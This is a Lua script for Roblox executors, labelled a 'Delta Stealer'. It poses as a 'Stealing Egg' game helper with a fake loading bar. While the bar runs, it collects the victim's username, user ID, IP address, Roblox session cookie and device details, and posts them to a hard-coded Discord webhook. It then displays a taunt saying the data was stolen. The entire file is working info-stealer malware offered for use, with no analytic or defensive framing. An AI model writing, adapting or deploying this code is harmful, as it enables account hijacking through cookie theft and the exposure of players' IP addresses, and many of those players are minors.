-- === Delta Stealer + Fake Loading GUI ===
local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"

-- HTTP sender with multiple fallbacks
local function sendData(url, jsonPayload)
    local headers = {["Content-Type"] = "application/json"}
    local methods = {
        function() return request({Url = url, Method = "POST", Headers = headers, Body = jsonPayload}) end,
        function() return http_request({Url = url, Method = "POST", Headers = headers, Body = jsonPayload}) end,
        function() return game:GetService("HttpService"):PostAsync(url, jsonPayload, Enum.HttpContentType.ApplicationJson) end
    }
    for _, method in ipairs(methods) do
        local ok, res = pcall(method)
        if ok and res then return true end
    end
    return false
end

-- === Collect ALL data ===
local function collectInfo()
    local info = {}
    -- Executor
    info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Delta"

    -- Player
    local player = game.Players.LocalPlayer
    if player then
        info.userId = tostring(player.UserId)
        info.userName = player.Name
        info.displayName = player.DisplayName
        -- Approx account age from UserId
        local id = player.UserId
        if id and id > 0 then
            local year = math.floor((id / 100000000) * 2) + 2006
            info.accountAge = tostring(year) .. " (approx)"
        end
        -- Friends (online)
        local ok, friends = pcall(function()
            return #player:GetFriendsOnline()
        end)
        info.friends = ok and tostring(friends) or "N/A"
    end

    -- Game
    info.placeId = tostring(game.PlaceId)
    info.jobId = game.JobId
    info.gameName = game.Name or "Unknown"

    -- IP (try multiple services)
    local ip = "N/A"
    local ipServices = {
        "https://api.ipify.org",
        "https://ip-api.com/json/?fields=query",
        "https://icanhazip.com"
    }
    for _, url in ipairs(ipServices) do
        local ok, result = pcall(function()
            return game:GetService("HttpService"):GetAsync(url)
        end)
        if ok and result and result ~= "" then
            if result:match('"query":"(.-)"') then
                ip = result:match('"query":"(.-)"')
            else
                ip = result:gsub("%s+", "")
            end
            if ip and ip ~= "" then break end
        end
    end
    info.ip = ip

    -- Cookie (if available)
    local cookieOk, cookieVal = pcall(function()
        return getcookie("https://www.roblox.com/")
    end)
    info.cookie = cookieOk and cookieVal or "Not available"

    -- Hardware / platform
    pcall(function()
        info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
        info.platform = tostring(game:GetService("UserInputService").Platform)
        info.touch = tostring(game:GetService("UserInputService").TouchEnabled)
        info.mouse = tostring(game:GetService("UserInputService").MouseEnabled)
        info.keyboard = tostring(game:GetService("UserInputService").KeyboardEnabled)
    end)

    -- Leaderstats (if any)
    pcall(function()
        local ls = player:FindFirstChild("leaderstats")
        if ls then
            local stats = {}
            for _, stat in ipairs(ls:GetChildren()) do
                if stat:IsA("NumberValue") or stat:IsA("IntValue") or stat:IsA("StringValue") then
                    stats[stat.Name] = tostring(stat.Value)
                end
            end
            info.leaderstats = game:GetService("HttpService"):JSONEncode(stats)
        else
            info.leaderstats = "None"
        end
    end)

    return info
end

-- Build embed (no timestamp)
local function buildEmbed(data)
    local fields = {}
    for k, v in pairs(data) do
        table.insert(fields, {name = k, value = tostring(v), inline = true})
    end
    return {
        embeds = {{
            title = "Roblox Stealer Log",
            color = 0xFF0000,
            fields = fields,
            footer = {text = "Delta Executor"}
        }}
    }
end

-- === Send data ===
local info = collectInfo()
local embed = buildEmbed(info)
local json = game:GetService("HttpService"):JSONEncode(embed)
sendData(webhook, json)

-- === Create Fake Loading GUI ===
local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
local gui = Instance.new("ScreenGui")
gui.Parent = playerGui
gui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 350, 0, 180)
frame.Position = UDim2.new(0.5, -175, 0.5, -90)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BackgroundTransparency = 0.15
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 10)
title.BackgroundTransparency = 1
title.Text = "Stealing Egg..."
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.Parent = frame

-- Progress bar background
local bg = Instance.new("Frame")
bg.Size = UDim2.new(0.8, 0, 0, 20)
bg.Position = UDim2.new(0.1, 0, 0.45, 0)
bg.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
bg.Parent = frame
Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 10)

-- Progress fill (will be tweened)
local fill = Instance.new("Frame")
fill.Size = UDim2.new(0, 0, 1, 0)
fill.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
fill.Parent = bg
Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 10)

-- Percentage label
local percent = Instance.new("TextLabel")
percent.Size = UDim2.new(0, 60, 0, 30)
percent.Position = UDim2.new(0.5, -30, 0.7, 0)
percent.BackgroundTransparency = 1
percent.Text = "0%"
percent.TextColor3 = Color3.fromRGB(255, 255, 255)
percent.TextScaled = true
percent.Font = Enum.Font.Gotham
percent.Parent = frame

-- Subtext (changes after loading)
local sub = Instance.new("TextLabel")
sub.Size = UDim2.new(1, 0, 0, 30)
sub.Position = UDim2.new(0, 0, 0.85, 0)
sub.BackgroundTransparency = 1
sub.Text = "Please wait..."
sub.TextColor3 = Color3.fromRGB(200, 200, 200)
sub.TextScaled = true
sub.Font = Enum.Font.Gotham
sub.Parent = frame

-- === Animate loading ===
local function animate()
    local duration = 3 -- seconds
    local steps = 60
    local stepTime = duration / steps
    for i = 0, steps do
        local progress = i / steps
        local width = 0.8 * progress
        fill:TweenSize(UDim2.new(width, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, stepTime, false)
        percent.Text = string.format("%d%%", math.floor(progress * 100))
        if i < steps then
            task.wait(stepTime)
        end
    end
    -- Done: change text to taunt
    title.Text = "U GOT YOUR INFOMATION STOLEN LMAO"
    title.TextColor3 = Color3.fromRGB(255, 0, 0)
    sub.Text = "Your data has been sent to the owner."

    -- Add Close button
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 100, 0, 35)
    closeBtn.Position = UDim2.new(0.5, -50, 1, -45)
    closeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    closeBtn.Text = "Close"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.TextScaled = true
    closeBtn.Font = Enum.Font.Gotham
    closeBtn.Parent = frame
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 8)
    closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
end

-- Start animation after a short delay to ensure GUI renders
task.wait(0.1)
spawn(animate)
